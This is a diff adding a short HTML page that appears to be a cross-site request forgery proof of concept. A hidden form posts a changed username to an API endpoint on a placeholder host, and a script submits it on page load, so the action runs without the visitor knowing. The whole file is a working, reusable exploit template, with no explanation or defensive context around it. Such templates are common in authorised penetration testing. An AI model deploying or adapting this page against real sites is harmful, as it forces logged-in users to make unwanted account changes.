@@ -1,0 +1,8 @@
+<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="username" type="hidden" value="CSRFd" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
